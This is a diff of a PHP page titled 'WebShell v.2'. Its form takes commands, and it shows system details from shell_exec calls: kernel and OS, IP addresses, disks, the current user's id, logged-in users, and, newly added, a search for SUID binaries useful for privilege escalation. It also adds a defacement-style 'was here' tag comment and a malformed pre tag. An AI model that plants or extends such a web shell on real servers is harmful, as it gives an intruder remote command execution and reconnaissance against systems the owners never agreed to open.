@@ -1,43 +1,61 @@
+<!-- MuteAvery was here <:~ -->
 <?php
 echo '<body style="background-color:#424242;">';
 ?>
 
 
 <!-- Authenticated -->
-<font style="float:left;" color="#F1F1F1"><b>WebShell v.1</b></font><br /><br />
-
-<fieldset style="border:2px solid #ffffff;opacity:0.5;border-radius:5px;background:#1867Ad;">
-<form style="float:left;color:#ffffff;" action='<?php echo $_SERVER["PHP_SELF"]?>' method="post">
+<font style="float:left;" color="#F1F1F1"><b>WebShell v.2 <:~ </b></font><br /><br />
+<fieldset style="border:2px solid #25F511;opacity:0.5;border-radius:5px;background:#000000;">
+<form style="float:left;color:#25F511;" action='<?php echo $_SERVER["PHP_SELF"]?>' method=
+"post">
 <b>Run Command:</b><br />
 <input type= "text" name="command" />
-<input type="submit" value="Make it so!"/><p>
+<input type="submit" value="Run"/><p>
 
 <b>System Info:</b><p>
 ------------------------------------------------------------------------------------------------------------
+
+<b>Kernel & OS Info</b>
 <?php
-$uname = shell_exec('uname -a');
+$uname = shell_exec("uname -a;  awk -F= '/^(PRETTY_NAME|BUILD_ID)=/ { gsub(/\"/, \"\", \$2); print \$1\": \"\$2 }' /etc/os-release");
 echo "<pre>$uname</pre>";
 ?>
 
+
+<b>Network interfaces</b>
 <?php
 $ip_addr = shell_exec("ip addr | grep inet | grep -v inet6 | awk '{print $2}' | grep -v 127");
 echo "<pre>$ip_addr</pre>";
 ?>
 
+<b>disks</b>
 <?php
 $disk = shell_exec("df -h");
 echo "<pre>$disk</pre>";
 ?>
 
+<b>User info</b>
 <?php
 $user = shell_exec("whoami; id");
 echo "<pre>$user</pre>";
 ?>
 
+<b> Connected Users </b>
 <?php
 $users = shell_exec("who -u");
 echo "<pre>$users</pre>";
 ?>
+
+<b>SUIDS</b>
+
+<?php
+$SUIDS = shell_exec("find / -perm /4000 2>/dev/null");
+echo "<pre>$SUIDS</pre>";
+?>
+
+
+
 
 </form>
 
@@ -49,9 +67,10 @@ echo "<pre>$users</pre>";
 <input type="file" name="file" /><P>
 <b>Current Remote Directory:</b><br />
 ----------------------------------------------------------
+
 <?php
 $pwd = shell_exec("pwd");
-echo "<pre>$pwd</pre>";
+echo "<1pre>$pwd</pre>";
 ?>
 
 </form></fieldset>
